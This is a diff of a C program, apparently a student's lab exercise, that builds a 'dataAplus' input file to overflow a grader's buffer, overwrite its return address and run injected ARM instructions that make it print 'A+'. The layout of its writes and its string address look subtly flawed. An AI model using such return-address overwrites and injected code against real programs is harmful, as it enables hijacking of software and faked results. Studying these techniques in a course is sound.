@@ -6,34 +6,33 @@ int main(void) {
     unsigned int payloadAddress, printfAddress;
     unsigned int ldrInstr, blInstr;
 
-    // Open the dataAplus file for writing
+    /* Open the dataAplus file for writing */
     dataAplus = fopen("dataAplus", "w+");
 
-    // Write the student name and a null byte, 12 characters
+    /* Write the student name and a null byte, 12 characters */
     fprintf(dataAplus, "Alex & Matt");
     putc('\0', dataAplus);
 
-    // Addresses need to be adjusted based on actual memory layout
-    printfAddress = 0x400690; // Address of printf in the grader
-    payloadAddress = 0x420100; // Payload location in memory
+    /*Addresses need to be adjusted based on actual memory layout */
+    printfAddress = 0x400690; 
+    payloadAddress = 0x420044; 
 
-    // Overwrite the return address with our payload address
+    /*Overwrite the return address with our payload address*/
     fwrite(&payloadAddress, sizeof(payloadAddress), 1, dataAplus);
 
-    // Payload: Set up register to point to "A+" string for printf
+    /*Payload: Set up register to point to "A+" string for printf*/
     ldrInstr = MiniAssembler_ldr(0, (unsigned long)"A+"); 
     fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);
 
-    // Branch to printf with "A+" string
+    /* Branch to printf with "A+" string */
     blInstr = MiniAssembler_bl(printfAddress, payloadAddress);
     fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
 
-    // Branch back to a safe point in the grader after printf
-    // This address needs to be adjusted based on actual memory layout
-    blInstr = MiniAssembler_bl(/* safe return address */payloadAddress + 8);
+    /*Branch back to a safe point in the grader after printf*/
+    blInstr = MiniAssembler_bl(0x40089c, payloadAddress + 8);
     fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
     
-    // Padding to fill buffer and reach the return address
+    /*Padding to fill buffer and reach the return address*/
     for (int i = 0; i < 24; i++) {
         putc('A', dataAplus);
     }
@@ -48,7 +47,7 @@ int main(void) {
     fprintf(dataAplus, "%c", 0x00);
     fprintf(dataAplus, "%c", 0x00);
    
-    // Close the file
+    /* Close the file*/
     fclose(dataAplus);
     return 0;
 }
